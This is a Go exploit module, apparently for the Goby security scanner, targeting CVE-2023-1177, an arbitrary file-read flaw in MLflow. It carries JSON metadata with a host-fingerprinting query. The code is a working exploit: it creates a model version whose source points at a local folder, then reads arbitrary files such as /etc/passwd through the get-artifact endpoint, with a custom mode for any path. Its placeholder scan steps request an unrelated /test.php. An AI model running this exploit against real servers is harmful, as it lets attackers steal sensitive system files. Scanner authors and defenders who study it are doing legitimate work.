package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MLflow model-versions file reading vulnerability (CVE-2023-1177)",
    "Description": "<p>MLflow is a platform that simplifies machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.</p><p>There is a file reading vulnerability in the model-versions module get-artifact of the MLflow open source platform. An attacker can read all sensitive files in the system.</p>",
    "Product": "MLflow",
    "Homepage": "https://github.com/mlflow/mlflow",
    "DisclosureDate": "2023-03-24",
    "PostTime": "2024-01-16",
    "Author": "h1ei1",
    "FofaQuery": "body=\"href=\\\"./static-files/favicon.ico\\\"\"",
    "GobyQuery": "body=\"href=\\\"./static-files/favicon.ico\\\"\"",
    "Level": "3",
    "Impact": "<p>There is a file reading vulnerability in the model-versions module get-artifact of the MLflow open source platform. An attacker can read all sensitive files in the system.</p>",
    "Recommendation": "<p>The manufacturer has released a security patch, please pay attention to the official website for updates: <a href=\"https://github.com/mlflow/mlflow\">https://github.com/mlflow/mlflow</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-1177"
    ],
    "CNNVD": [
        "CNNVD-202303-1944"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "MLflow model-versions 文件读取漏洞（CVE-2023-1177）",
            "Product": "MLflow",
            "Description": "<p>MLflow 是一个简化机器学习开发的平台，包括跟踪实验、将代码打包成可重复的运行以及共享和部署模型。<br></p><p>MLflow 开源平台 model-versions 模块 get-artifact 存在文件读取漏洞，攻击者可读取系统所有敏感文件。<br></p>",
            "Recommendation": "<p>厂商已发布安全补丁，请及时关注官网更新：<a href=\"https://github.com/mlflow/mlflow\" target=\"_blank\">https://github.com/mlflow/mlflow</a><br></p>",
            "Impact": "<p>MLflow 开源平台 model-versions 模块 get-artifact 存在文件读取漏洞，攻击者可读取系统所有敏感文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "MLflow model-versions file reading vulnerability (CVE-2023-1177)",
            "Product": "MLflow",
            "Description": "<p>MLflow is a platform that simplifies machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.</p><p>There is a file reading vulnerability in the model-versions module get-artifact of the MLflow open source platform. An attacker can read all sensitive files in the system.</p>",
            "Recommendation": "<p>The manufacturer has released a security patch, please pay attention to the official website for updates: <a href=\"https://github.com/mlflow/mlflow\" target=\"_blank\">https://github.com/mlflow/mlflow</a><br></p>",
            "Impact": "<p>There is a file reading vulnerability in the model-versions module get-artifact of the MLflow open source platform. An attacker can read all sensitive files in the system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10907"
}`

	readFileFlagFx7pbLm := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(filePath, "/") {
			filePath = "/" + filePath
		}
		filePath = strings.ReplaceAll(filePath, `\\`, `/`)
		filePath = strings.ReplaceAll(filePath, `\`, `/`)
		lastIndex := strings.LastIndex(filePath, "/")
		if lastIndex == -1 || len(filePath)-1 == lastIndex {
			return nil, errors.New("漏洞利用失败")
		}
		filename := filePath[lastIndex+1:]
		folder := filePath[:lastIndex+1]
		modelName := goutils.RandomHexString(16)
		createModelRequestConfig := httpclient.NewPostRequestConfig("/ajax-api/2.0/mlflow/registered-models/create")
		createModelRequestConfig.VerifyTls = false
		createModelRequestConfig.FollowRedirect = false
		createModelRequestConfig.Header.Store("Content-Type", "application/json")
		createModelRequestConfig.Data = fmt.Sprintf(`{"name":"%s"}`, modelName)
		if resp, err := httpclient.DoHttpRequest(hostInfo, createModelRequestConfig); resp != nil && strings.Contains(resp.RawBody, `creation_timestamp`) {
			createModelVersionRequestConfig := httpclient.NewPostRequestConfig("/ajax-api/2.0/mlflow/model-versions/create")
			createModelVersionRequestConfig.VerifyTls = false
			createModelVersionRequestConfig.FollowRedirect = false
			createModelVersionRequestConfig.Header.Store("Content-Type", "application/json")
			createModelVersionRequestConfig.Data = fmt.Sprintf(`{"name":"%s","source":"file://%s"}`, modelName, folder)
			if resp, err := httpclient.DoHttpRequest(hostInfo, createModelVersionRequestConfig); resp != nil && strings.Contains(resp.RawBody, `source`) {
				readFileRequestConfig := httpclient.NewGetRequestConfig(fmt.Sprintf("/model-versions/get-artifact?path=%s&name=%s&version=1", filename, modelName))
				readFileRequestConfig.VerifyTls = false
				readFileRequestConfig.FollowRedirect = false
				return httpclient.DoHttpRequest(hostInfo, readFileRequestConfig)
			} else if err != nil {
				return nil, err
			}
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if resp, _ := readFileFlagFx7pbLm(hostInfo, `/etc/passwd`); resp != nil && len(regexp.MustCompile(`[\w-]+:[^:]+:\d+:\d+:[^:]*:[^:]+:[^:]+`).FindAllString(resp.Utf8Html, -1)) > 1 {
				ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path + `?` + resp.Request.URL.RawQuery
				return true
			}
			if resp, _ := readFileFlagFx7pbLm(hostInfo, `c:/Windows/win.ini`); resp != nil && resp.Header != nil && strings.Contains(resp.HeaderString.String(), `attachment; filename=`) && strings.Contains(resp.Utf8Html, `[extensions]`) && strings.Contains(resp.Utf8Html, `[files]`) {
				ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path + `?` + resp.Request.URL.RawQuery
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "custom" {
				resp, err := readFileFlagFx7pbLm(expResult.HostInfo, goutils.B2S(ss.Params["filePath"]))
				if resp != nil && resp.StatusCode == 200 && resp.Header != nil && strings.Contains(resp.HeaderString.String(), `attachment; filename=`) {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
